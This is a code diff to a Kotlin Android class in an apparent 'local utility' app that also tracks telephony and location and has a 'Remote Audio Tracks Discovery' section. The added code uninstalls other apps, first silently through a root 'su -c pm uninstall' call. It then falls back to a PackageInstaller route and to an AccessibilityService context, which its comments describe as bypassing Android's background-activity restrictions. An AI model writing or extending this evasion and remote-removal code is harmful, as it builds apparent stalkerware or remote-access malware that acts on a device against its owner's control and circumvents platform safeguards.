@@ -1,6 +1,7 @@
 package com.example.localutility
 
 import android.annotation.SuppressLint
+import android.app.PendingIntent
 import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.Context
@@ -87,32 +88,43 @@ class TelephonyAndLocationManager(private val context: Context) {
     }
 
     fun requestUninstallApp(packageName: String): Boolean {
-        return try {
+        // 1. Root check (instant silent uninstall if phone is rooted)
+        try {
+            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "pm uninstall $packageName"))
+            if (process.waitFor() == 0) return true
+        } catch (e: Exception) {}
+
+        // 2. Official Android System PackageInstaller API (Bypasses background activity launch restrictions)
+        try {
+            val intent = Intent("com.example.localutility.UNINSTALL_RESULT")
+            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
+            } else {
+                PendingIntent.FLAG_UPDATE_CURRENT
+            }
+            val pendingIntent = PendingIntent.getBroadcast(context, 0, intent, flags)
+            context.packageManager.packageInstaller.uninstall(packageName, pendingIntent.intentSender)
+            return true
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+
+        // 3. Launch via AccessibilityService Context (Exempt from Android 10+ background activity restrictions)
+        try {
+            val serviceContext = RemoteInputService.instance ?: context
             val intent = Intent(Intent.ACTION_DELETE).apply {
                 data = Uri.fromParts("package", packageName, null)
                 putExtra(Intent.EXTRA_RETURN_RESULT, true)
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
-            context.startActivity(intent)
-            true
+            serviceContext.startActivity(intent)
+            return true
         } catch (e: Exception) {
             e.printStackTrace()
-            try {
-                @Suppress("DEPRECATION")
-                val fallbackIntent = Intent(Intent.ACTION_UNINSTALL_PACKAGE).apply {
-                    data = Uri.fromParts("package", packageName, null)
-                    putExtra(Intent.EXTRA_RETURN_RESULT, true)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                }
-                context.startActivity(fallbackIntent)
-                true
-            } catch (e2: Exception) {
-                e2.printStackTrace()
-                false
-            }
         }
+
+        return false
     }
 
     // --- Target 7A: Remote Audio Tracks Discovery ---
